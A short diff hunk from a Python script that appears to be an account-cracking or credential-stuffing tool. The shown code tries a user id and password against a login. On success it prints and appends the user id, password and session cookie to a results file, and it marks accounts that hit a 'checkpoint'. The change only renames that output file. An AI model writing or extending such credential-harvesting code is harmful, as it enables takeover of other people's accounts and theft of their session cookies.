@@ -149,7 +149,7 @@ def host(uid,pwx,fb):
                 if 'Photoshop' in res:
                     print(f"\r\r[SUCCESSFUL] {xd} | {ps} | {coki}\n\n")
                     oks.append(uid)
-                    open("test_ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
+                    open("testok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                 break
             elif "checkpoint" in heron_brand:
                 print(f"\r\r [CHECKPOINT] {uid} | {ps}")
